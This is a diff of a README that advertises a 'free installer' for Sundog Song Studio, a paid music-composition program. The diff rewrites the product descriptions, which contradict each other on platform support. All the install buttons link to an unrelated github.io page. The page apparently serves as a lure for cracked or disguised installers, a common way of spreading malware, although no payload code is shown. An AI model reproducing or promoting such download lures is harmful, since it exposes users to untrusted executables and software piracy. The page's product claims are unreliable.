@@ -8,7 +8,7 @@
   <img src="https://img.shields.io/badge/Category-Music+Composition-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 Sundog Song Studio Free Installer** — Sundog Song Studio is a chord progression and song structure software that helps musicians create harmonically rich music without needing deep music theory knowledge. Works without internet access, no account required. Full offline installation.
+**💻 Sundog Song Studio Free Installer** — Sundog Song Studio is a music creation application for Windows and macOS focused on helping musicians write melodies, chord progressions, and basslines using music theory guidance. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Sundog Song Studio](https://img.shields.io/badge/⬇_Install_Sundog%20Song%20Studio-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Sundog Song Studio](https://img.shields.io/badge/⬇_Install_Sundog+Song+Studio-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About Sundog Song Studio
 
-Sundog Song Studio is a chord progression and song structure software that helps musicians create harmonically rich music without needing deep music theory knowledge. It generates chord progressions, generates melodies, and exports MIDI to your DAW.
+Sundog Song Studio is a music creation application for Windows and macOS focused on helping musicians write melodies, chord progressions, and basslines using music theory guidance. Enter a chord progression and Sundog generates harmonically correct melody and bass suggestions. With MIDI output and DAW integration via ReWire, Sundog helps songwriters overcome writer's block with theory-based composition assistance.
 
 ---
 
 ## ❌ Problem: Sundog Song Studio is hard to access
 
-- **Paid License** — Requires purchase; no permanent free tier
-- **MIDI Export Only** — Does not produce audio directly; requires a DAW for audio production
-- **Windows Only** — No macOS or Linux version available
-- **Learning Investment** — Music theory concepts underlying the tool take time to understand
+- **Commercial License** — Paid software
+- **MIDI Dependency** — Core workflow involves MIDI output to a DAW or hardware synthesizer
+- **Theory Assistance Model** — Generative suggestions require musical context and refinement
+- **DAW Integration** — Standalone use limited; best as composition assistance within a DAW workflow
 
 ---
 
@@ -81,7 +81,7 @@ Sundog Song Studio is a chord progression and song structure software that helps
 
 <div align="center">
 
-[![⬇ Install Sundog Song Studio](https://img.shields.io/badge/⬇_Install_Sundog%20Song%20Studio-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Sundog Song Studio](https://img.shields.io/badge/⬇_Install_Sundog+Song+Studio-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -121,11 +121,11 @@ Sundog Song Studio is a chord progression and song structure software that helps
 
 ---
 
-**Sundog Song Studio Free Installer** — Sundog Song Studio is a chord progression and song structure software that helps musicians create harmonically rich music without needing deep music theory knowledge. Install without internet connection today!
+**Sundog Song Studio Free Installer** — Sundog Song Studio is a music creation application for Windows and macOS focused on helping musicians write melodies, chord progressions, and basslines using music theory guidance. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install Sundog Song Studio](https://img.shields.io/badge/⬇_Install_Sundog%20Song%20Studio-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Sundog Song Studio](https://img.shields.io/badge/⬇_Install_Sundog+Song+Studio-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
